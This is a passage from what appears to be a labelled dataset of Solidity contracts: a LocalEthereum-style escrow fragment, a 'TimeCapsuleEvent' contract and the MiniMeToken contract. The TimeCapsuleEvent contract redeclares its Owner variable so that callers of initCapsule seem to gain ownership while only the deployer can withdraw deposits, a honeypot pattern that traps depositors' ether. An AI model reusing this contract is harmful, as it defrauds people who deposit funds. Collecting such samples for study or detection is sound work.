_escrow.totalGasFeesSpentByRelayer + (msg.sender == relayer ? GAS_doRelease + _additionalGas : 0);\r\r\n        delete escrows[_tradeHash];\r\r\n        Released(_tradeHash);\r\r\n        transferMinusFees(_buyer, _value, _gasFees, _fee);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    uint16 constant GAS_doDisableSellerCancel = 12100;\r\r\n    function doDisableSellerCancel(\r\r\n      \/**\r\r\n       * Stops the seller from cancelling the trade.\r\r\n       * Can only be called the buyer.\r\r\n       * Used to mark the trade as paid, or if the buyer has a dispute.\r\r\n       *\/\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee,\r\r\n      uint128 _additionalGas\r\r\n    ) private returns (bool) {\r\r\n        var (_escrow, _tradeHash) = getEscrowAndHash(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        if (!_escrow.exists) return false;\r\r\n        if(_escrow.sellerCanCancelAfter == 0) return false;\r\r\n        escrows[_tradeHash].sellerCanCancelAfter = 0;\r\r\n        SellerCancelDisabled(_tradeHash);\r\r\n        if (msg.sender == relayer) {\r\r\n          increaseGasSpent(_tradeHash, GAS_doDisableSellerCancel + _additionalGas);\r\r\n        }\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    uint16 constant GAS_doBuyerCancel = 36100;\r\r\n    function doBuyerCancel(\r\r\n      \/**\r\r\n       * Cancels the trade and returns the ether to the seller.\r\r\n       * Can only be called the buyer.\r\r\n       *\/\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee,\r\r\n      uint128 _additionalGas\r\r\n    ) private returns (bool) {\r\r\n        var (_escrow, _tradeHash) = getEscrowAndHash(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        if (!_escrow.exists) return false;\r\r\n        uint128 _gasFees = _escrow.totalGasFeesSpentByRelayer + (msg.sender == relayer ? GAS_doBuyerCancel + _additionalGas : 0);\r\r\n        delete escrows[_tradeHash];\r\r\n        CancelledByBuyer(_tradeHash);\r\r\n        transferMinusFees(_seller, _value, _gasFees, 0);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    uint16 constant GAS_doSellerCancel = 36100;\r\r\n    function doSellerCancel(\r\r\n      \/**\r\r\n       * Cancels the trade and returns the ether to the seller.\r\r\n       * Can only be called the seller.\r\r\n       * Can only be called if the payment window was missed by the buyer\r\r\n       *\/\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee,\r\r\n      uint128 _additionalGas\r\r\n    ) private returns (bool) {\r\r\n        var (_escrow, _tradeHash) = getEscrowAndHash(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        if (!_escrow.exists) return false;\r\r\n        if(_escrow.sellerCanCancelAfter <= 1 || _escrow.sellerCanCancelAfter > block.timestamp) return false;\r\r\n        uint128 _gasFees = _escrow.totalGasFeesSpentByRelayer + (msg.sender == relayer ? GAS_doSellerCancel + _additionalGas : 0);\r\r\n        delete escrows[_tradeHash];\r\r\n        CancelledBySeller(_tradeHash);\r\r\n        transferMinusFees(_seller, _value, _gasFees, 0);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    uint16 constant GAS_doSellerRequestCancel = 12100;\r\r\n    function doSellerRequestCancel(\r\r\n      \/**\r\r\n       * Called by the seller if the buyer is unresponsive\r\r\n       * Can only be called on unlimited payment window trades (sellerCanCancelAfter == 1)\r\r\n       * Sets the payment window to `requestCancellationMinimumTime` from now, in which it can be cancelled.\r\r\n       *\/\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee,\r\r\n      uint128 _additionalGas\r\r\n    ) private returns (bool) {\r\r\n        \/\/ Called on unlimited payment window trades wheret the buyer is not responding\r\r\n        var (_escrow, _tradeHash) = getEscrowAndHash(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        if (!_escrow.exists) return false;\r\r\n        if(_escrow.sellerCanCancelAfter != 1) return false;\r\r\n        escrows[_tradeHash].sellerCanCancelAfter = uint32(block.timestamp) + requestCancellationMinimumTime;\r\r\n        SellerRequestedCancel(_tradeHash);\r\r\n        if (msg.sender == relayer) {\r\r\n          increaseGasSpent(_tradeHash, GAS_doSellerRequestCancel + _additionalGas);\r\r\n        }\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    uint16 constant GAS_doResolveDispute = 36100;\r\r\n    function resolveDispute(\r\r\n      \/**\r\r\n       * Called by the arbitrator to resolve a dispute\r\r\n       * Requires the signed ACTION_DISPUTE actionByte from either the buyer or the seller\r\r\n       *\/\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee,\r\r\n      uint8 _v,\r\r\n      bytes32 _r,\r\r\n      bytes32 _s,\r\r\n      uint8 _buyerPercent\r\r\n    ) external onlyArbitrator {\r\r\n        address _signature = ecrecover(keccak256(_tradeID, ACTION_DISPUTE), _v, _r, _s);\r\r\n        require(_signature == _buyer || _signature == _seller);\r\r\n\r\r\n        var (_escrow, _tradeHash) = getEscrowAndHash(_tradeID, _seller, _buyer, _value, _fee);\r\r\n        require(_escrow.exists);\r\r\n        require(_buyerPercent <= 100);\r\r\n\r\r\n        uint256 _totalFees = _escrow.totalGasFeesSpentByRelayer + GAS_doResolveDispute;\r\r\n        require(_value - _totalFees <= _value); \/\/ Prevent underflow\r\r\n        feesAvailableForWithdraw += _totalFees; \/\/ Add the the pot for localethereum to withdraw\r\r\n\r\r\n        delete escrows[_tradeHash];\r\r\n        DisputeResolved(_tradeHash);\r\r\n        _buyer.transfer((_value - _totalFees) * _buyerPercent \/ 100);\r\r\n        _seller.transfer((_value - _totalFees) * (100 - _buyerPercent) \/ 100);\r\r\n    }\r\r\n\r\r\n    function release(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee) external returns (bool){\r\r\n      require(msg.sender == _seller);\r\r\n      return doRelease(_tradeID, _seller, _buyer, _value, _fee, 0);\r\r\n    }\r\r\n    function disableSellerCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee) external returns (bool) {\r\r\n      require(msg.sender == _buyer);\r\r\n      return doDisableSellerCancel(_tradeID, _seller, _buyer, _value, _fee, 0);\r\r\n    }\r\r\n    function buyerCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee) external returns (bool) {\r\r\n      require(msg.sender == _buyer);\r\r\n      return doBuyerCancel(_tradeID, _seller, _buyer, _value, _fee, 0);\r\r\n    }\r\r\n    function sellerCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee) external returns (bool) {\r\r\n      require(msg.sender == _seller);\r\r\n      return doSellerCancel(_tradeID, _seller, _buyer, _value, _fee, 0);\r\r\n    }\r\r\n    function sellerRequestCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee) external returns (bool) {\r\r\n      require(msg.sender == _seller);\r\r\n      return doSellerRequestCancel(_tradeID, _seller, _buyer, _value, _fee, 0);\r\r\n    }\r\r\n\r\r\n    function relaySellerCannotCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee, uint128 _maximumGasPrice, uint8 _v, bytes32 _r, bytes32 _s) external returns (bool) {\r\r\n      return relay(_tradeID, _seller, _buyer, _value, _fee, _maximumGasPrice, _v, _r, _s, ACTION_SELLER_CANNOT_CANCEL, 0);\r\r\n    }\r\r\n    function relayBuyerCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee, uint128 _maximumGasPrice, uint8 _v, bytes32 _r, bytes32 _s) external returns (bool) {\r\r\n      return relay(_tradeID, _seller, _buyer, _value, _fee, _maximumGasPrice, _v, _r, _s, ACTION_BUYER_CANCEL, 0);\r\r\n    }\r\r\n    function relayRelease(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee, uint128 _maximumGasPrice, uint8 _v, bytes32 _r, bytes32 _s) external returns (bool) {\r\r\n      return relay(_tradeID, _seller, _buyer, _value, _fee, _maximumGasPrice, _v, _r, _s, ACTION_RELEASE, 0);\r\r\n    }\r\r\n    function relaySellerCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee, uint128 _maximumGasPrice, uint8 _v, bytes32 _r, bytes32 _s) external returns (bool) {\r\r\n      return relay(_tradeID, _seller, _buyer, _value, _fee, _maximumGasPrice, _v, _r, _s, ACTION_SELLER_CANCEL, 0);\r\r\n    }\r\r\n    function relaySellerRequestCancel(bytes16 _tradeID, address _seller, address _buyer, uint256 _value, uint16 _fee, uint128 _maximumGasPrice, uint8 _v, bytes32 _r, bytes32 _s) external returns (bool) {\r\r\n      return relay(_tradeID, _seller, _buyer, _value, _fee, _maximumGasPrice, _v, _r, _s, ACTION_SELLER_REQUEST_CANCEL, 0);\r\r\n    }\r\r\n\r\r\n    function relay(\r\r\n      bytes16 _tradeID,\r\r\n      address _seller,\r\r\n      address _buyer,\r\r\n      uint256 _value,\r\r\n      uint16 _fee,\r\r\n      uint128 _maximumGasPrice,\r\r\n      uint8 _v,\r\r\n      bytes32 _r,\r\r\n      bytes32 _s,\r\r\n      uint8 _actionByte,\r\r\n      uint128 _additionalGas\r\r\n    ) private returns (bool) {\r\r\n      address _relayedSender = getRelayedSender(_tradeID, _actionByte, _maximumGasPrice, _v, _r, _s);\r\r\n      if (_relayedSender == _buyer) {\r\r\n        if (_actionByte == ACTION_SELLER_CANNOT_CANCEL) {\r\r\n          return doDisableSellerCancel(_tradeID, _seller, _buyer, _value, _fee, _additionalGas);\r\r\n        } else if (_actionByte == ACTION_BUYER_CANCEL) {\r\r\n          return doBuyerCancel(_tradeID, _seller, _buyer, _value, _fee, _additionalGas);\r\r\n        }\r\r\n      } else if (_relayedSender == _seller) {\r\r\n        if (_actionByte == ACTION_RELEASE) {\r\r\n          return doRelease(_tradeID, _seller, _buyer, _value, _fee, _additionalGas);\r\r\n        } else if (_actionByte == ACTION_SELLER_CANCEL) {\r\r\n          return doSellerCancel(_tradeID, _seller, _buyer, _value, _fee, _additionalGas);\r\r\n        } else if (_actionByte == ACTION_SELLER_REQUEST_CANCEL){\r\r\n          return doSellerRequestCancel(_tradeID, _seller, _buyer, _value, _fee, _additionalGas);\r\r\n        }\r\r\n      } else {\r\r\n        return false;\r\r\n      }\r\r\n    }\r\r\n\r\r\n    uint16 constant GAS_batchRelayBaseCost = 28500;\r\r\n    function batchRelay(\r\r\n      \/**\r\r\n       * Call multiple relay methods at once to save on gas.\r\r\n       *\/\r\r\n        bytes16[] _tradeID,\r\r\n        address[] _seller,\r\r\n        address[] _buyer,\r\r\n        uint256[] _value,\r\r\n        uint16[] _fee,\r\r\n        uint128[] _maximumGasPrice,\r\r\n        uint8[] _v,\r\r\n        bytes32[] _r,\r\r\n        bytes32[] _s,\r\r\n        uint8[] _actionByte\r\r\n    ) public returns (bool[]) {\r\r\n        bool[] memory _results = new bool[](_tradeID.length);\r\r\n        uint128 _additionalGas = uint128(msg.sender == relayer ? GAS_batchRelayBaseCost \/ _tradeID.length : 0);\r\r\n        for (uint8 i=0; i<_tradeID.length; i++) {\r\r\n            _results[i] = relay(_tradeID[i], _seller[i], _buyer[i], _value[i], _fee[i], _maximumGasPrice[i], _v[i], _r[i], _s[i], _actionByte[i], _additionalGas);\r\r\n        }\r\r\n        return _results;\r\r\n    }\r\r\n\r\r\n    function increaseGasSpent(bytes32 _tradeHash, uint128 _gas) private {\r\r\n        \/** Increase `totalGasFeesSpentByRelayer` to be charged later on completion of the trade.\r\r\n         *\/\r\r\n        escrows[_tradeHash].totalGasFeesSpentByRelayer += _gas * uint128(tx.gasprice);\r\r\n    }\r\r\n\r\r\n    function transferMinusFees(address _to, uint256 _value, uint128 _totalGasFeesSpentByRelayer, uint16 _fee) private {\r\r\n        uint256 _totalFees = (_value * _fee \/ 10000) + _totalGasFeesSpentByRelayer;\r\r\n        if(_value - _totalFees > _value) return; \/\/ Prevent underflow\r\r\n        feesAvailableForWithdraw += _totalFees; \/\/ Add the the pot for localethereum to withdraw\r\r\n        _to.transfer(_value - _totalFees);\r\r\n    }\r\r\n\r\r\n    function withdrawFees(address _to, uint256 _amount) onlyOwner external {\r\r\n      \/**\r\r\n       * Withdraw fees collected by the contract. Only the owner can call this.\r\r\n       *\/\r\r\n        require(_amount <= feesAvailableForWithdraw); \/\/ Also prevents underflow\r\r\n        feesAvailableForWithdraw -= _amount;\r\r\n        _to.transfer(_amount);\r\r\n    }\r\r\n\r\r\n    function setArbitrator(address _newArbitrator) onlyOwner external {\r\r\n        \/**\r\r\n         * Set the arbitrator to a new address. Only the owner can call this.\r\r\n         * @param address _newArbitrator\r\r\n         *\/\r\r\n        arbitrator = _newArbitrator;\r\r\n    }\r\r\n\r\r\n    function setOwner(address _newOwner) onlyOwner external {\r\r\n        \/**\r\r\n         * Change the owner to a new address. Only the owner can call this.\r\r\n         * @param address _newOwner\r\r\n         *\/\r\r\n        owner = _newOwner;\r\r\n    }\r\r\n\r\r\n    function setRelayer(address _newRelayer) onlyOwner external {\r\r\n        \/**\r\r\n         * Change the relayer to a new address. Only the owner can call this.\r\r\n         * @param address _newRelayer\r\r\n         *\/\r\r\n        relayer = _newRelayer;\r\r\n    }\r\r\n\r\r\n    function setRequestCancellationMinimumTime(uint32 _newRequestCancellationMinimumTime) onlyOwner external {\r\r\n        \/**\r\r\n         * Change the requestCancellationMinimumTime. Only the owner can call this.\r\r\n         * @param uint32 _newRequestCancellationMinimumTime\r\r\n         *\/\r\r\n        requestCancellationMinimumTime = _newRequestCancellationMinimumTime;\r\r\n    }\r\r\n\r\r\n    function transferToken(Token _tokenContract, address _transferTo, uint256 _value) onlyOwner external {\r\r\n        \/**\r\r\n         * If ERC20 tokens are sent to this contract, they will be trapped forever.\r\r\n         * This function is way for us to withdraw them so we can get them back to their rightful owner\r\r\n         *\/\r\r\n         _tokenContract.transfer(_transferTo, _value);\r\r\n    }\r\r\n    function transferTokenFrom(Token _tokenContract, address _transferTo, address _transferFrom, uint256 _value) onlyOwner external {\r\r\n        \/**\r\r\n         * If ERC20 tokens are sent to this contract, they will be trapped forever.\r\r\n         * This function is way for us to withdraw them so we can get them back to their rightful owner\r\r\n         *\/\r\r\n         _tokenContract.transferFrom(_transferTo, _transferFrom, _value);\r\r\n    }\r\r\n    function approveToken(Token _tokenContract, address _spender, uint256 _value) onlyOwner external {\r\r\n        \/**\r\r\n         * If ERC20 tokens are sent to this contract, they will be trapped forever.\r\r\n         * This function is way for us to withdraw them so we can get them back to their rightful owner\r\r\n         *\/\r\r\n         _tokenContract.approve(_spender, _value);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.16;\r\r\n\r\r\ncontract Ownable {\r\r\n    address public Owner;\r\r\n    \r\r\n    function Ownable() { Owner = msg.sender; }\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        if( Owner == msg.sender ) {\r\r\n            _;\r\r\n        }\r\r\n    }\r\r\n    \r\r\n    function transferOwner(address _owner) onlyOwner {\r\r\n        if( this.balance == 0 ) {\r\r\n            Owner = _owner;\r\r\n        }\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract TimeCapsuleEvent is Ownable {\r\r\n    address public Owner;\r\r\n    mapping (address=>uint) public deposits;\r\r\n    uint public openDate;\r\r\n    \r\r\n    event Initialized(address indexed owner, uint openOn);\r\r\n    function initCapsule(uint open) {\r\r\n        Owner = msg.sender;\r\r\n        openDate = open;\r\r\n        Initialized(Owner, openDate);\r\r\n    }\r\r\n\r\r\n    function() payable { deposit(); }\r\r\n\r\r\n    event Deposit(address indexed depositor, uint amount);\r\r\n    function deposit() payable {\r\r\n        if( msg.value >= 0.5 ether ) {\r\r\n            deposits[msg.sender] += msg.value;\r\r\n            Deposit(msg.sender, msg.value);\r\r\n        } else throw;\r\r\n    }\r\r\n\r\r\n    event Withdrawal(address indexed withdrawer, uint amount);\r\r\n    function withdraw(uint amount) payable onlyOwner {\r\r\n        if( now >= openDate ) {\r\r\n            uint max = deposits[msg.sender];\r\r\n            if( amount <= max && max > 0 ) {\r\r\n                msg.sender.send( amount );\r\r\n                Withdrawal(msg.sender, amount);\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function kill() onlyOwner {\r\r\n        if( this.balance == 0 )\r\r\n            suicide( msg.sender );\r\r\n\t}\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.6;\r\r\n\r\r\n\/*\r\r\n    Copyright 2016, Jordi Baylina\r\r\n\r\r\n    This program is free software: you can redistribute it and\/or modify\r\r\n    it under the terms of the GNU General Public License as published by\r\r\n    the Free Software Foundation, either version 3 of the License, or\r\r\n    (at your option) any later version.\r\r\n\r\r\n    This program is distributed in the hope that it will be useful,\r\r\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\r\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\r\n    GNU General Public License for more details.\r\r\n\r\r\n    You should have received a copy of the GNU General Public License\r\r\n    along with this program.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\r\r\n *\/\r\r\n\r\r\n\/\/\/ @title MiniMeToken Contract\r\r\n\/\/\/ @author Jordi Baylina\r\r\n\/\/\/ @dev This token contract&#39;s goal is to make it easy for anyone to clone this\r\r\n\/\/\/  token using the token distribution at a given block, this will allow DAO&#39;s\r\r\n\/\/\/  and DApps to upgrade their features in a decentralized manner without\r\r\n\/\/\/  affecting the original token\r\r\n\/\/\/ @dev It is ERC20 compliant, but still needs to under go further testing.\r\r\n\r\r\n\r\r\n\/\/\/ @dev The token controller contract must implement these functions\r\r\ncontract TokenController {\r\r\n    \/\/\/ @notice Called when `_owner` sends ether to the MiniMe Token contract\r\r\n    \/\/\/ @param _owner The address that sent the ether to create tokens\r\r\n    \/\/\/ @return True if the ether is accepted, false if it throws\r\r\n    function proxyPayment(address _owner) payable returns(bool);\r\r\n\r\r\n    \/\/\/ @notice Notifies the controller about a token transfer allowing the\r\r\n    \/\/\/  controller to react if desired\r\r\n    \/\/\/ @param _from The origin of the transfer\r\r\n    \/\/\/ @param _to The destination of the transfer\r\r\n    \/\/\/ @param _amount The amount of the transfer\r\r\n    \/\/\/ @return False if the controller does not authorize the transfer\r\r\n    function onTransfer(address _from, address _to, uint _amount) returns(bool);\r\r\n\r\r\n    \/\/\/ @notice Notifies the controller about an approval allowing the\r\r\n    \/\/\/  controller to react if desired\r\r\n    \/\/\/ @param _owner The address that calls `approve()`\r\r\n    \/\/\/ @param _spender The spender in the `approve()` call\r\r\n    \/\/\/ @param _amount The amount in the `approve()` call\r\r\n    \/\/\/ @return False if the controller does not authorize the approval\r\r\n    function onApprove(address _owner, address _spender, uint _amount)\r\r\n        returns(bool);\r\r\n}\r\r\n\r\r\ncontract Controlled {\r\r\n    \/\/\/ @notice The address of the controller is the only address that can call\r\r\n    \/\/\/  a function with this modifier\r\r\n    modifier onlyController { if (msg.sender != controller) throw; _; }\r\r\n\r\r\n    address public controller;\r\r\n\r\r\n    function Controlled() { controller = msg.sender;}\r\r\n\r\r\n    \/\/\/ @notice Changes the controller of the contract\r\r\n    \/\/\/ @param _newController The new controller of the contract\r\r\n    function changeController(address _newController) onlyController {\r\r\n        controller = _newController;\r\r\n    }\r\r\n}\r\r\n\r\r\n\/\/\/ @dev The actual token contract, the default controller is the msg.sender\r\r\n\/\/\/  that deploys the contract, so usually this token will be deployed by a\r\r\n\/\/\/  token controller contract, which Giveth will call a \"Campaign\"\r\r\ncontract MiniMeToken is Controlled {\r\r\n\r\r\n    string public name;                \/\/The Token&#39;s name: e.g. DigixDAO Tokens\r\r\n    uint8 public decimals;             \/\/Number of decimals of the smallest unit\r\r\n    string public symbol;              \/\/An identifier: e.g. REP\r\r\n    string public version = &#39;MMT_0.1&#39;; \/\/An arbitrary versioning scheme\r\r\n\r\r\n\r\r\n    \/\/\/ @dev `Checkpoint` is the structure that attaches a block number to a\r\r\n    \/\/\/  given value, the block number attached is the one that last changed the\r\r\n    \/\/\/  value\r\r\n    struct  Checkpoint {\r\r\n\r\r\n        \/\/ `fromBlock` is the block number that the value was generated from\r\r\n        uint128 fromBlock;\r\r\n\r\r\n        \/\/ `value` is the amount of tokens at a specific block number\r\r\n        uint128 value;\r\r\n    }\r\r\n\r\r\n    \/\/ `parentToken` is the Token address that was cloned to produce this token;\r\r\n    \/\/  it will be 0x0 for a token that was not cloned\r\r\n    MiniMeToken public parentToken;\r\r\n\r\r\n    \/\/ `parentSnapShotBlock` is the block number from the Parent Token that was\r\r\n    \/\/  used to determine the initial distribution of the Clone Token\r\r\n    uint public parentSnapShotBlock;\r\r\n\r\r\n    \/\/ `creationBlock` is the block number that the Clone Token was created\r\r\n    uint public creationBlock;\r\r\n\r\r\n    \/\/ `balances` is the map that tracks the balance of each address, in this\r\r\n    \/\/  contract when the balance changes the block number that the change\r\r\n    \/\/  occurred is also included in the map\r\r\n    mapping (address => Checkpoint[]) balances;\r\r\n\r\r\n    \/\/ `allowed` tracks any extra transfer rights as in all ERC20 tokens\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n    \/\/ Tracks the history of the `totalSupply` of the token\r\r\n    Checkpoint[] totalSupplyHistory;\r\r\n\r\r\n    \/\/ Flag that determines if the token is transferable or not.\r\r\n    bool public transfersEnabled;\r\r\n\r\r\n    \/\/ The factory used to create new clone tokens\r\r\n    MiniMeTokenFactory public tokenFactory;\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Constructor\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Constructor to create a MiniMeToken\r\r\n    \/\/\/ @param _tokenFactory The address of the MiniMeTokenFactory contract that\r\r\n    \/\/\/  will create the Clone token contracts, the token factory needs to be\r\r\n    \/\/\/  deployed first\r\r\n    \/\/\/ @param _parentToken Address of the parent token, set to 0x0 if it is a\r\r\n    \/\/\/  new token\r\r\n    \/\/\/ @param _parentSnapShotBlock Block of the parent token that will\r\r\n    \/\/\/  determine the initial distribution of the clone token, set to 0 if it\r\r\n    \/\/\/  is a new token\r\r\n    \/\/\/ @param _tokenName Name of the new token\r\r\n    \/\/\/ @param _decimalUnits Number of decimals of the new token\r\r\n    \/\/\/ @param _tokenSymbol Token Symbol for the new token\r\r\n    \/\/\/ @param _transfersEnabled If true, tokens will be able to be transferred\r\r\n    function MiniMeToken(\r\r\n        address _tokenFactory,\r\r\n        address _parentToken,\r\r\n        uint _parentSnapShotBlock,\r\r\n        string _tokenName,\r\r\n        uint8 _decimalUnits,\r\r\n        string _tokenSymbol,\r\r\n        bool _transfersEnabled\r\r\n    ) {\r\r\n        tokenFactory = MiniMeTokenFactory(_tokenFactory);\r\r\n        name = _tokenName;                                 \/\/ Set the name\r\r\n        decimals = _decimalUnits;                          \/\/ Set the decimals\r\r\n        symbol = _tokenSymbol;                             \/\/ Set the symbol\r\r\n        parentToken = MiniMeToken(_parentToken);\r\r\n        parentSnapShotBlock = _parentSnapShotBlock;\r\r\n        transfersEnabled = _transfersEnabled;\r\r\n        creationBlock = block.number;\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ ERC20 Methods\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Send `_amount` tokens to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _amount The amount of tokens to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _amount) returns (bool success) {\r\r\n        if (!transfersEnabled) throw;\r\r\n        return doTransfer(msg.sender, _to, _amount);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Send `_amount` tokens to `_to` from `_from` on the condition it\r\r\n    \/\/\/  is approved by `_from`\r\r\n    \/\/\/ @param _from The address holding the tokens being transferred\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _amount The amount of tokens to be transferred\r\r\n    \/\/\/ @return True if the transfer was successful\r\r\n    function transferFrom(address _from, address _to, uint256 _amount\r\r\n    ) returns (bool success) {\r\r\n\r\r\n        \/\/ The controller of this contract can move tokens around at will,\r\r\n        \/\/  this is important to recognize! Confirm that you trust the\r\r\n        \/\/  controller of this contract, which in most situations should be\r\r\n        \/\/  another open source smart contract or 0x0\r\r\n        if (msg.sender != controller) {\r\r\n            if (!transfersEnabled) throw;\r\r\n\r\r\n            \/\/ The standard ERC 20 transferFrom functionality\r\r\n            if (allowed[_from][msg.sender] < _amount) return false;\r\r\n            allowed[_from][msg.sender] -= _amount;\r\r\n        }\r\r\n        return doTransfer(_from, _to, _amount);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev This is the actual transfer function in the token contract, it can\r\r\n    \/\/\/  only be called by other functions in this contract.\r\r\n    \/\/\/ @param _from The address holding the tokens being transferred\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _amount The amount of tokens to be transferred\r\r\n    \/\/\/ @return True if the transfer was successful\r\r\n    function doTransfer(address _from, address _to, uint _amount\r\r\n    ) internal returns(bool) {\r\r\n\r\r\n           if (_amount == 0) {\r\r\n               return true;\r\r\n           }\r\r\n\r\r\n           \/\/ Do not allow transfer to 0x0 or the token contract itself\r\r\n           if ((_to == 0) || (_to == address(this))) throw;\r\r\n\r\r\n           \/\/ If the amount being transfered is more than the balance of the\r\r\n           \/\/  account the transfer returns false\r\r\n           var previousBalanceFrom = balanceOfAt(_from, block.number);\r\r\n           if (previousBalanceFrom < _amount) {\r\r\n               return false;\r\r\n           }\r\r\n\r\r\n           \/\/ Alerts the token controller of the transfer\r\r\n           if (isContract(controller)) {\r\r\n               if (!TokenController(controller).onTransfer(_from, _to, _amount))\r\r\n               throw;\r\r\n           }\r\r\n\r\r\n           \/\/ First update the balance array with the new value for the address\r\r\n           \/\/  sending the tokens\r\r\n           updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\r\r\n\r\r\n           \/\/ Then update the balance array with the new value for the address\r\r\n           \/\/  receiving the tokens\r\r\n           var previousBalanceTo = balanceOfAt(_to, block.number);\r\r\n           updateValueAtNow(balances[_to], previousBalanceTo + _amount);\r\r\n\r\r\n           \/\/ An event to make the transfer easy to find on the blockchain\r\r\n           Transfer(_from, _to, _amount);\r\r\n\r\r\n           return true;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @param _owner The address that&#39;s balance is being requested\r\r\n    \/\/\/ @return The balance of `_owner` at the current block\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balanceOfAt(_owner, block.number);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_spender` to spend `_amount` tokens on\r\r\n    \/\/\/  its behalf. This is a modified version of the ERC20 approve function\r\r\n    \/\/\/  to be a little bit safer\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _amount The amount of tokens to be approved for transfer\r\r\n    \/\/\/ @return True if the approval was successful\r\r\n    function approve(address _spender, uint256 _amount) returns (bool success) {\r\r\n        if (!transfersEnabled) throw;\r\r\n\r\r\n        \/\/ To change the approve amount you first have to reduce the addresses&#180;\r\r\n        \/\/  allowance to zero by calling `approve(_spender,0)` if it is not\r\r\n        \/\/  already 0 to mitigate the race condition described here:\r\r\n        \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n        if ((_amount!=0) && (allowed[msg.sender][_spender] !=0)) throw;\r\r\n\r\r\n        \/\/ Alerts the token controller of the approve function call\r\r\n        if (isContract(controller)) {\r\r\n            if (!TokenController(controller).onApprove(msg.sender, _spender, _amount))\r\r\n                throw;\r\r\n        }\r\r\n\r\r\n        allowed[msg.sender][_spender] = _amount;\r\r\n        Approval(msg.sender, _spender, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev This function makes it easy to read the `allowed[]` map\r\r\n    \/\/\/ @param _owner The address of the account that owns the token\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens of _owner that _spender is allowed\r\r\n    \/\/\/  to spend\r\r\n    function allowance(address _owner, address _spender\r\r\n    ) constant returns (uint256 remaining) {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_spender` to send `_amount` tokens on\r\r\n    \/\/\/  its behalf, and then a function is triggered in the contract that is\r\r\n    \/\/\/  being approved, `_spender`. This allows users to use their tokens to\r\r\n    \/\/\/  interact with contracts in one function call instead of two\r\r\n    \/\/\/ @param _spender The address of the contract able to transfer the tokens\r\r\n    \/\/\/ @param _amount The amount of tokens to be approved for transfer\r\r\n    \/\/\/ @return True if the function call was successful\r\r\n    function approveAndCall(address _spender, uint256 _amount, bytes _extraData\r\r\n    ) returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _amount;\r\r\n        Approval(msg.sender, _spender, _amount);\r\r\n\r\r\n        \/\/ This portion is copied from ConsenSys&#39;s Standard Token Contract. It\r\r\n        \/\/  calls the receiveApproval function that is part of the contract that\r\r\n        \/\/  is being approved (`_spender`). The function should look like:\r\r\n        \/\/  `receiveApproval(address _from, uint256 _amount, address\r\r\n        \/\/  _tokenContract, bytes _extraData)` It is assumed that the call\r\r\n        \/\/  